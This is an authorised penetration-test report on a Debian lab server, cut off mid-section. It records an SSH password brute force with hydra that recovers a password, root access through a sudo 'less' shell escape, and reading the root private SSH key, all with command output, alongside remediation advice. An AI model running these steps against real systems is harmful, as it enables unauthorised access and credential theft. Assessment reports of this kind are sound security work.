# Preamble

## Approval

*The approval for pentesting the system with the IP addresses 10.1.0.5 and fd01::5 located at the DHBW Mannheim was given by Johannes Bauer.*

## Confidentiality Notice

*This report contains sensitive, privileged, and confidential information. Precautions should be taken to protect the confidentiality of the information in this document. Publication of this report may cause reputational damage to the DHBW Mannheim or facilitate attacks against the DHBW Mannheim. \censor{Philipp Fruck} and \censor{Pius Walter} shall not be held liable for special, incidental, collateral or consequential damages arising out of the use of this information.*

## Disclaimer

*Note that this assessment may not disclose all vulnerabilities that are present on the systems within the scope of the engagement. This report is a summary of the findings from a "point-in-time" assessment made on the server with the given IP addresses 10.1.0.5 and fd01::5. Any changes made to the environment during the period of testing may affect the results of the assessment.*


# Introduction

## Executive Summary

An attacker is able to force the simple password of the user `bluey`. This allows him to easily log in to the system and consequently escalate the highest system privileges (`root`) through an existing misconfiguration on the system.

## Statement of Work

> Warum machen wir das?

## Samples

The scope of the Pentest are the two IP addresses 10.1.0.5 and fd01::5 which are mapped to the same machine. The Pentest was initiated as a blackbox test since there was no information provided except for the IP addresses.


# Classification Definitions

## Risk Classification

Level                                   | Score | Description
|----------|-----|--------------------------------------------------|
\cellcolor{risklevelcritical}{Critical} | 5     | The vulnerability poses an immediate threat. Remediation of the vulnerability should take place immediately. |
\cellcolor{risklevelhigh}{High}         | 4     | The vulnerability poses an urgent threat and its remediation should be prioritized. |
\cellcolor{risklevelmedium}{Medium}     | 3     | Successful exploitation is possible and can lead to a significant disruption in the functioning of systems. This vulnerability should be addressed as soon as possible. |
\cellcolor{risklevellow}{Low}           | 2     | The vulnerability poses a negligible/minor threat. The presence of this vulnerability should be noted and remediated if possible. |
\cellcolor{gray}{Information}           | 1     | These findings do not pose a clear threat, but may result in function being compromised or sensitive information being disclosed. |


# Summary of Findings

> Was haben wir alles gefunden?
> Absteigend nach Relevanz


# Walkthrough and Findings

## nmap Scan

We started with a nmap scan because this is a standard procedure for blackbox testing.

```default
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p1-65535 10.1.0.5       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 04:25 EST
Nmap scan report for 10.1.0.5
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
20321/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.30 seconds
```

```default
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p1-65535 -6 fd01::5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 10:08 EST
Nmap scan report for fd01::5
Host is up (0.013s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
20321/tcp open  unknown
41947/tcp open  ssl/unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
```

After running a nmap scan against each of the ip addresses we noticed that the service on port `41947` is only listening on the IPv6 address. We decided to target the Apache webserver on port `80` first.

## Apache Webserver

The Apache webserver is publicly exposed on both addresses. The main web page is the default Apache Debian web page. The nmap scan fingerprints the version to be `Apache httpd 2.4.51 ((Debian))` which is confirmed in the later course.

### Unencrypted Communication

 It is only listening on port 80 and only accepts connections over the HTTP protocol. This means that no encryption is used.

### Directory Listing

In order to further investigate the content being served by the Apache webserver the nmap http-enum plugin is utilized. 

```default
┌──(kali㉿kali)-[~]
└─$ nmap -p80 --script=http-enum 10.1.0.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 04:30 EST
Nmap scan report for 10.1.0.5
Host is up (0.016s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /home/: Potentially interesting directory w/ listing on 'apache/2.4.51 (debian)'

Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
```

The http enum plugin was able to quickly identify the `/home` path on the webserver which looks like an interesting hint. Navigating to the given URL in the Browser shows the standard Apache directory listing presenting the following directories

  - `bingo`
  - `bluey`
  - `root`

These directories hint to the available users. All of them are empty.

## User bluey

As shown in the nmap scan there is a SSH server running on port 22. So we decide to brute force the passwords of the users discovered by the Apache directory listing using hydra and the publicly available password list `rockyou.txt`. Hydra quickly identifies a simple password for the `bluey` user. For the other users there were no results found.

```default
┌──(kali㉿kali)-[~]
└─$ hydra -l bluey -P /usr/share/wordlists/rockyou.txt 10.1.0.5 -t 4 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-05 04:35:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.1.0.5:22/
[22][ssh] host: 10.1.0.5   login: bluey   password: phoenix
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-05 04:35:32
```

Using the password `phoenix` we are able to log in to the server using `ssh bluey@10.1.0.5`.

```default
ssh bluey@10.1.0.5
bluey@10.1.0.5's password: 
Linux secureding 5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64
Ziz iz ze most zecure ziztem in ze world. Iz Schörmen Kwolitie!!! Weri nais.
Last login: Fri Mar  4 14:19:28 2022 from 10.2.0.14
bluey@secureding:~$ 
```

### Profile Review

Starting the review of the user we entered the `history` command to investigate the last actions of the given user. The command did not return any results which means that the history was cleaned, or the user was not actively used before.

Following a default forensic approach we entered the commands `env` and `alias` as an attempt to retrieve hints about the purpose of the user. Furthermore, we checked the common files in the user `home` directory including `.bashrc` and `.profile`. Neither the commands nor the files let us to any suspicious activity.

In order to easily track down the permissions of files we overwrite the `ls` command with the following alias

```default
alias ls='ls -h -l -p -A --color=auto --time-style=+"  %d.%m.%Y %H:%M:%S"'
```

Further it was checked which folders are present in the `PATH`. Again, there were no differences to the standard installation.

```default
bluey@secureding:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Entering the command `groups` brought the result that the user `bluey` is only in the group `bluey`.

### Directory Review

After taking a look to the standards of a give Linux user profile we investigated the other files in the users `home` folder. With the overwritten `ls` command we saw the following list of interesting directories

  - `.ssh`
  - `.management`

#### .ssh
We found an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions.

```default
bluey@secureding:~/.ssh$ ls
total 8.0K
-rw------- 1 bluey bluey 411   18.02.2022 15:48:56 id_ed25519
-rw------- 1 bluey bluey  98   18.02.2022 15:48:56 id_ed25519.pub
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
bluey@secureding:~$ ssh-keygen -y -f .ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDsuFejN+bYDIBakjKTjszppGIcYKmXEpqEgLQs5Trbh bluey@secureding
bluey@secureding:~$ cat .ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDsuFejN+bYDIBakjKTjszppGIcYKmXEpqEgLQs5Trbh bluey@secureding
```

#### .management

Within the next step we looked at the `.management` folder and found the certificate pair listed below. Interestingly the certificates have their permissions set to `600` despite the users umask being `0022`.

```default
bluey@secureding:~/.management$ ls
total 8.0K
-rw------- 1 bluey bluey 1.3K   16.05.2018 22:45:05 client.crt
-rw------- 1 bluey bluey 1.7K   31.01.2020 15:52:24 client.key
bluey@secureding:~$ umask
0022
```

Looking at the timestamp we figured out that the client key seems like it was last modified one and a half year after the client certificate. The next logical thing to do was to validate the private key and ensure its modulus matches the one of the client certificate. The SHA-256 sums of both moduli match which makes this case even more suspicious.

```default
bluey@secureding:~/.management$ openssl rsa -check -noout -in client.key 
RSA key ok
bluey@secureding:~/.management$ openssl rsa -modulus -noout -in client.key | openssl sha256
(stdin)= b807312729df58b623c639069f77bc73c5faacc269fa833a6861df00530f3b9e
bluey@secureding:~/.management$ openssl x509 -modulus -noout -in client.crt | openssl sha256
(stdin)= b807312729df58b623c639069f77bc73c5faacc269fa833a6861df00530f3b9e
```

We inspected the certificate using the `openssl` command line suite.

```default
bluey@secureding:~/.management$ openssl x509 -in client.crt -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 11505421400876481398 (0x9fab77ce466b7b76)
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=Management Client Certificate, O=Secure Systems Inc., OU=admin=false
        Validity
            Not Before: Feb 18 15:48:57 2022 GMT
            Not After : Mar 20 15:48:57 2022 GMT
        Subject: CN=Management Client Certificate, O=Secure Systems Inc., OU=admin=false
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
[...]
            X509v3 Basic Constraints: 
                CA:TRUE
[...]
```

Looking at the signature algorithm one can immediately see that the certificate is using `sha1WithRSAEncryption` which is inherently insecure. Furthermore, the public key has a length of 2048 bit which currently is the recommended minimum length.

Two more interesting facts about the certificate are that the given organizational unit (`OU`) is set to `OU=admin=false` and the given certificate is a CA root certificate, which is shown by the `CA:TRUE` part in the basic constraints block. We keep this in mind and investigate later on.

### The sudoers File

Making a digression back to our root(s), we took a look to the `/etc/sudoers` file. This file has to major issues

  1. Instead of the default permissions (`440`) the file has a permission of `644` which means that the file is world readable to every user on the system.
  2. The user `bluey` is allowed to use the `less` command with root privileges without any password against a specific file.

```default
bluey@secureding:~/.management$ ls /etc/sudoers
-rw-r--r-- 1 root root 774   18.02.2022 15:48:56 /etc/sudoers
bluey@secureding:~/.management$ grep bluey /etc/sudoers
# allow bluey read-only access to /var/log/auth.log
bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log
```

Since `less` is an interactive command line tool we can now easily elevate our privileges.

```default
sudo less /var/log/auth.log
> !id
bluey@secureding:~/.management$ sudo less /var/log/auth.log
sudo: unable to resolve host secureding: Name or service not known
uid=0(root) gid=0(root) groups=0(root)
> :e /root/.ssh/id_ed25519
```

As shown by the output of the `id` command we now have a fully qualified root shell to elevate our privileges. Since we did not want to mess up with the system permissions we simply extracted the private root ssh key to our local machine in order to connect to the system as root user.

To mitigate this issue it is recommended to replace `less` with a non-interactive command like `cat` which can then be piped into `less`.

## User root

Logged in with the `root` user we first take a look to the roots home folder. Starting the same way as with the user `bluey` we checked the `history` command which returned a result this time.

```default
secureding [~]: history
    1  ls
    2  cd /etc/
    3  ls
    4  cat hostname
    5  ls
    6  cd /usr/
    7  ls
    8  apt-get install vim
    9  apt-get install acl apt-file bzip2 convmv cryptsetup gnupg git grub2 hdparm hexedit inetutils-tools kbd less linux-image-generic lm-sensors locales lshw lsof lzma man mlocate nano openssh-client openssh-server p7zip-full pciutils psmisc python3 pwgen recode rsync screen sqlite3 unzip usbutils vim xz-utils net-tools
   10  cd /usr; git clone https://github.com/johndoe31415/jbin
   11  cd
   12  skeleton_install --f
   13  ls
   14  ls
   15  cd /etc/
   16  ls
   17  vi locale.gen 
   18  locale-gen 
   19  ls
   20  cd boot/
   21  ls
   22  cd ..
   23  ls
   24  cd home/
   25  ls
   26  cd ..
   27  ls
   28  ls
   29  du -h
   30  ls
   31  ls
   32  apt-get install build-essential
   33  ls
   34  ls cvmstage2/
   35  ls
   36  apt-get install sudo
   37  apt-get install apache2
   38  ls
   39  apt-get install libcurl-dev
   40  apt-get install libcurl4-openssl-dev
   41  apt-get install iptables socat
```

As indicated by the asterisk in the `/etc/shadow` file, there is no password set for the root user. This is generally considered a good practice.

```default
secureding [~]: grep root /etc/shadow
root:*:19040:0:99999:7:::
```

### Directory Review

The standard files in the roots home directory were uninteresting the same way as the ones of bluey, except for the `.bashrc` which sources the `jbin` collection.

```default
secureding [~]: cat .bashrc 
#!/bin/bash
# Remove this line if you do not wish it to be overwritten by an update.
. /usr/jbin/profile.local
```

The `jbin` collection is a Swiss army knife when it comes to system configuration. For example, it sets the default umask for the root user to `0077`.

```default
secureding [~]: umask
0077
```

A few unusual files we found in the root directory include the `.screenrc` and the `.inputrc` which are not created by default. Also, a custom configuration for vim has been deployed. Further interesting files were the `.config/marco-compton.conf`, the `.config/mpv/mpv.conf` and the `.xmodmaprc` which are used to configure a graphical environment and video player respectively. However, there is no graphical environment installed on the machine.

#### .ssh

Like at user bluey we found an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions. Further there is an `authorized_keys` file that allows connection from multiple users, seemingly including the user `bingo`. We will later confirm that this is the public key of the user bingo.

```default
secureding [~/.ssh]: ls
total 12K
-rw------- 1 root root 393   18.02.2022 15:48:57 authorized_keys
-rw------- 1 root root 411   18.02.2022 15:48:57 id_ed25519
-rw------- 1 root root  97   18.02.2022 15:48:57 id_ed25519.pub
secureding [~/.ssh]: cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM0EhQP4e3BVrq0R9nPQzfolf9J49W/UDxSAbQIj6RDM joe@reliant
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVnbP4txFCQtsfAiZ85sLeZjOJu8ICmxBDuokzTp6Up joe@offsec-concentrator
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
secureding [~]: ssh-keygen -y -f .ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
secureding [~]: cat .ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
```

Since we have now validated the public key of the root user we can now confirm that the root user can log in using his own ssh key, since it is also included in the `authorized_keys` file. This is not considered as a best practice because

  1. If the private user is only present for the root user and does not exist for any other user on any other machine it is useless to access a machine via ssh he already has shell access to.
  2. If the private key is copied from another machine or another user, this is bad practice as a private key should only be accessible to a single user at a single host.

#### The .rnd File

The most interesting file in the root folder is the `.rnd` file. This file is seemingly used as a seed for a random number generator.

In the later report we will proof that this random file is used by OpenSSL.

```default
secureding [~]: ls .rnd 
-rw------- 1 root root 1,0K   18.02.2022 15:48:57 .rnd
secureding [~]: sha256sum .rnd 
d288c0091af93f3128f66329631ca2b66742ce17f5adb10a0b319911c9a8fe69  .rnd
```

## User bingo

As indicated by the exclamation mark in the `/etc/shadow` file, the password of the user `bingo` is locked. This does not necessarily mean that the account is disabled. If the user has other authentication options like an SSH key or some kind of hardware token he is still able to log in to his account.

```default
secureding [~]: grep bingo /etc/shadow
bingo:!:19041:0:99999:7:::
```

The command `groups bingo` shows that the user is only in his own `bingo` group.

### Directory Review

All the dotfiles in the home directory of the user `bingo` are identical to the ones of the user `bluey`.

```default
secureding [~]: ls /home/bingo/
total 16K
-rw-r--r-- 1 bingo bingo  220   04.08.2021 20:25:59 .bash_logout
-rw-r--r-- 1 bingo bingo 3,5K   04.08.2021 20:25:59 .bashrc
-rw-r--r-- 1 bingo bingo  807   04.08.2021 20:25:59 .profile
drwx------ 2 bingo bingo 4,0K   18.02.2022 15:48:56 .ssh/
```

#### .ssh

Like the other two users described before, the user `bingo` has an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions.

```default
secureding [~]: ls /home/bingo/.ssh/
total 8,0K
-rw------- 1 bingo bingo 411   18.02.2022 15:48:56 id_ed25519
-rw------- 1 bingo bingo  98   18.02.2022 15:48:56 id_ed25519.pub
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
secureding [~]: ssh-keygen -y -f /home/bingo/.ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
secureding [~]: cat /home/bingo/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
```

As already shown before the user bingo indeed has the ability to login via SSH as user root into the given machine. These circumstances are similar to a privilege escalation and should be avoided at all cost. If the user requires (partial) root privileges this should rather be handled properly via the `/etc/sudoers` file.

## Operating System

The target systems run on the latest stable version of Debian GNU/Linux 11 (bullseye) and has the hostname `secureding`. Furthermore, it is running on the fairly recent kernel version `5.10.84-1 (2021-12-08)` with up-to-date packages installed from the Debian stable repo.

The file `/etc/os-release` gave the following output and consequently a current version of Debian is installed.

```default
bluey@secureding:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

### Missing Security Updates

The `/etc/apt/sources.list` only contains the following single line of repos. This means that there are no security updates for vulnerable software available.

```default
deb http://ftp.de.debian.org/debian bullseye main
```

To enable security updates it is recommended to add the two new following lines to the `/etc/apt/sources.list`.

```default
deb http://ftp.de.debian.org/debian bullseye main

# note that this is optional
deb http://ftp.de.debian.org/debian bullseye-updates main

deb http://ftp.de.debian.org/debian-security bullseye-security main
```

After enabling and running `sudo apt update` the security repos the following list of updates is available.

```default
secureding [~]: apt list --upgradable
Listing... Done
apache2-bin/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
apache2-data/stable-security 2.4.52-1~deb11u2 all [upgradable from: 2.4.51-1~deb11u1]
apache2-utils/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
apache2/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
bsdextrautils/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
bsdutils/stable-security 1:2.36.1-8+deb11u1 amd64 [upgradable from: 1:2.36.1-8]
cryptsetup-bin/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
cryptsetup-initramfs/stable-security 2:2.3.7-1+deb11u1 all [upgradable from: 2:2.3.5-1]
cryptsetup-run/stable-security 2:2.3.7-1+deb11u1 all [upgradable from: 2:2.3.5-1]
cryptsetup/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
fdisk/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libblkid1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libcryptsetup12/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
libexpat1/stable-security 2.2.10-2+deb11u3 amd64 [upgradable from: 2.2.10-2]
libfdisk1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libmount1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libsasl2-2/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsasl2-modules-db/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsasl2-modules/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsmartcols1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libssl1.1/stable-security 1.1.1k-1+deb11u2 amd64 [upgradable from: 1.1.1k-1+deb11u1]
libuuid1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
linux-image-amd64/stable-security 5.10.103-1 amd64 [upgradable from: 5.10.84-1]
mount/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
openssl/stable-security 1.1.1k-1+deb11u2 amd64 [upgradable from: 1.1.1k-1+deb11u1]
util-linux/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
```

#### Apache2 Available Security Updates

This version of Apache2 is vulnerable to the following CVEs.

CVE | CVSS | Short Description
--|-|-----
CVE-2021-44790 | **\textcolor{risklevelcritical}{9.8}** | Possible buffer overflow when parsing multipart content in mod_lua
CVE-2021-44224 | **\textcolor{risklevelhigh}{8.2}** | Possible NULL dereference or SSRF in forward proxy configurations

### Service Identification

In order to identify vulnerabilities on a system we need to identify all the running services first.

#### Systemd Files

Our first attempt was to cycle through the output of the `systemctl` command. The following three services stood out by either their name or in case of the `Dilithium regeneration server for overcritical Warp plasma` by their description.

```default
secureding [~]: ls /usr/lib/systemd/system | grep -iP "drs|mgmt|soca"
-rw------- 1 root root  348   27.10.2018 20:02:46 drsfowp.service
-rw------- 1 root root  311   19.06.2018 08:48:40 mgmtserver.service
-rw------- 1 root root  235   11.08.2019 15:16:35 socat.service
```

Having identified those three services we wanted to list their entry points.

```default
secureding [~]: for service in {drsfowp,mgmtserver,socat}; do
  cmd=$(grep ExecStart /usr/lib/systemd/system/${service}.service | cut -d "=" -f 2)
  echo $service $cmd
done
drsfowp /usr/local/bin/openssl s_server -accept 443 -WWW -cert /etc/drsfowp/drsfowp.crt -key /etc/drsfowp/drsfowp.key
mgmtserver /opt/mgmtserver/mgmtserver '{ "certfile": "/etc/management-server/server.crt", "keyfile": "/etc/management-server/server.key" }'
socat /usr/bin/socat TCP6-LISTEN:41947,fork TCP4:127.0.0.1:443
```

This gives us a good understanding of which service is responsible for which open port.

#### Netstat Command

To identify all services with open port on the system we executed `netstat` as the root user.

```default
secureding [~]: netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address       Foreign Address     State       PID/Program name
tcp        0      0 0.0.0.0:22          0.0.0.0:*           LISTEN      193655/sshd: /usr/s
tcp        0      0 0.0.0.0:443         0.0.0.0:*           LISTEN      251/openssl
tcp6       0      0 :::80               :::*                LISTEN      363/apache2
tcp6       0      0 :::22               :::*                LISTEN      193655/sshd: /usr/s
tcp6       0      0 :::41947            :::*                LISTEN      256/socat
tcp6       0      0 :::20321            :::*                LISTEN      200349/openssl
```

This also shows us the service on port `443` that was not accessible through our nmap scan. However, as shown by the systemd files the TCP4 `443` port is proxied to the TCP6 `41947` port by socat which is accessible from the outside.

#### PS Command

To verify no other suspicious programs are running we had a look at all running system processes.

```default
secureding [~]: ps aux
USER     PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
[...]
root     251  0.0  0.1   5360  3868 ?    Ss   Feb18   0:00 /usr/local/bin/openssl s_server -accept 443 -WWW -cert /etc/drsfowp/drsfowp.crt -key /etc/drsfowp/drsfowp.key
[...]
root     256  0.0  0.1   8728  3020 ?    Ss   Feb18   0:00 /usr/bin/socat TCP6-LISTEN:41947,fork TCP4:127.0.0.1:443
[...]
root     363  0.0  0.2   6636  5164 ?    Ss   Feb18   1:07 /usr/sbin/apache2 -k start
[...]
root  193655  0.0  0.3  13292  7668 ?    Ss   Mär07   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root  200348  0.0  0.4  17044  9684 ?    Ss   Mär17   0:00 /usr/bin/python3 /opt/mgmtserver/mgmtserver { "certfile": "/etc/management-server/server.crt", "keyfile": "/etc/management-server/server.key" }
root  200349  0.0  0.2   6928  4284 ?    S    Mär17   0:00 /usr/bin/openssl s_server -accept 20321 -cert /etc/management-server/server.crt -key /etc/management-server/server.key -naccept 1 -Verify 1
[...]
```

Except for the services we were already aware of no interesting processes were found.

### Service Inspection

The following services are further inspected in the chapters below.

| Port | Service name | Service description |
|-|-|-|
| 22 | sshd | The OpenSSH server. |
| 80 | apache2 | The Apache2 webserver. |
| 443 | drsfowp | Starts an OpenSSL `s_server`. |
| 20321 | mgmtserver | A custom Python service. |
| 41947 | socat | Admin tool proxying the drsfowp service. |

#### SSH Service

We know the server is running a recent version of OpenSSH. We checked the `/etc/ssh/` directory for misconfigured permissions, but everything seems fine here.

```default
secureding [~]: sshd --version
unknown option -- -
OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021
[...]
```

It should be noted that the OpenSSH server is using a recent version of OpenSSL and not the custom version location in `/usr/local/bin/openssl`. The difference between those two versions is explained in depth later.

Further, checked the client configuration in `/etc/ssh/ssh_config` which represents the default configuration for a Debian system. Additionally, the `/etc/ssh/ssh_config.d/` directory is empty.

Continuing with the server configuration in `/etc/ssh/sshd_config` there are a few suboptimal configurations to point out.

  - First and foremost `MaxAuthTries` is set to `100000` which is a way to high and allows password brute forcing.
  - `PermitRootLogin` has its default value of `prohibit-password`. This is not a security issue but also not a best practice. It is recommended to deactivate root login entirely.
  - The `PasswordAuthentication` is not disabled but SSH key authentication should be enforced.
  - Fail2ban is not configured, but it could be setup to have additional protection against brute force attacks.
  - Optionally the default SSH port can be changed from `22` to some random port number in the higher port range. Though it should be noted that this is only an obfuscation method and does not provide any real security benefit apart from reducing the amount of requests.

Additionally, also the `/etc/ssh/sshd_config.d/` directory contains no separate configuration files.

#### Apache2 Service

As already indicated by the nmap scan we can now confirm that our Apache2 version is indeed `2.4.51`.

```default
secureding [~]: apache2 -v
Server version: Apache/2.4.51 (Debian)
Server built:   2021-10-07T17:49:44
```

To check for non-standard configuration we calculated the `sha256sum` of all the files in the directories listed below and compared them to a default installation of the same Apache2 version.

Even though the files were equal to the default ones this does not mean that the server is configured properly. For example the server has no `mod_ssl` or `mod_gnutls` enabled. Furthermore, it is serving the default web root at `/var/www/html/` which it exposes through the default Apache2 directory listing.

```default
secureding [~]: ls /var/www/html/*
-rw-r--r-- 1 root root  11K   06.03.2022 10:01:28 /var/www/html/index.html

/var/www/html/home:
total 12K
drwxr-xr-x 2 root root 4,0K   18.02.2022 15:48:57 bingo/
drwxr-xr-x 2 root root 4,0K   18.02.2022 15:48:57 bluey/
drwxr-xr-x 2 root root 4,0K   18.02.2022 15:48:57 root/
```

#### drsfowp Service

Next we inspected the `Dilithium regeneration server for overcritical Warp plasma`.

```default
secureding [~]: sudo systemctl status drsfowp.service
sudo: unable to resolve host secureding: Name or service not known
● drsfowp.service - Dilithium regeneration server for overcritical Warp plasma
     Loaded: loaded (/lib/systemd/system/drsfowp.service; enabled; vendor preset: enabled)
     Active: active (running) since Fri 2022-02-18 17:34:23 UTC; 4 weeks 0 days ago
   Main PID: 251 (openssl)
      Tasks: 1 (limit: 2340)
     Memory: 2.4M
        CPU: 445ms
     CGroup: /system.slice/drsfowp.service
             └─251 /usr/local/bin/openssl s_server -accept 443 -WWW -cert /etc/drsfowp/drsfowp.crt -key /etc/drsfowp/drsfowp.key
```
This service is basically launching an OpenSSL `s_server` which is accessible through HTTPS and is running on port `443` which is only reachable on localhost. This service is configured to use the certificates in `/etc/drsfowp/`.

```default
secureding [~]: ls /etc/drsfowp/
total 8,0K
-rw------- 1 root root 1,1K   31.08.2017 16:40:27 drsfowp.crt
-rw------- 1 root root 1,7K   14.04.2016 08:56:06 drsfowp.key
```

The permissions of the `/etc/drsfowp/` directory and the certificate files are configured properly which are only accessible for the root user (`700` and `600` respectively). 

The next logical thing to do was to validate the private key and
ensure its modulus matches the one of the client certificate.

```default
secureding [/etc/drsfowp]: openssl rsa -check -noout -in drsfowp.key 
RSA key ok
secureding [/etc/drsfowp]: openssl rsa -modulus -noout -in drsfowp.key | openssl sha256
(stdin)= 9d7a07c073b43f47e28026ac916f8cf237f5855b43aa523348e696d85c0b0b3f
secureding [/etc/drsfowp]: openssl x509 -modulus -noout -in drsfowp.crt | openssl sha256
(stdin)= 9d7a07c073b43f47e28026ac916f8cf237f5855b43aa523348e696d85c0b0b3f
```

We inspected the certificate using the OpenSSL command line suite.

```default
secureding [/etc/drsfowp]: openssl x509 -in drsfowp.crt -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 13873365658389020248 (0xc088188fe3617e58)
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=DRSFOWP
        Validity
            Not Before: Feb 18 15:48:57 2022 GMT
            Not After : Mar 20 15:48:57 2022 GMT
        Subject: CN=DRSFOWP
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
[...]
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                84:ED:75:AA:50:D6:36:42:8A:3A:A1:CB:85:80:3D:1C:7F:D5:13:ED
            X509v3 Authority Key Identifier: 
                keyid:84:ED:75:AA:50:D6:36:42:8A:3A:A1:CB:85:80:3D:1C:7F:D5:13:ED

            X509v3 Basic Constraints: 
                CA:TRUE
[...]
```

Looking at the signature algorithm one can immediately see that the certificate is using `sha1WithRSAEncryption` which is inherently insecure. Furthermore, the public key has a length of 2048 bit which currently is the recommended minimum length.

Also, the certificate is a CA root certificate, which is shown by the `CA:TRUE`
part in the basic constraints block.

##### Access using cURL

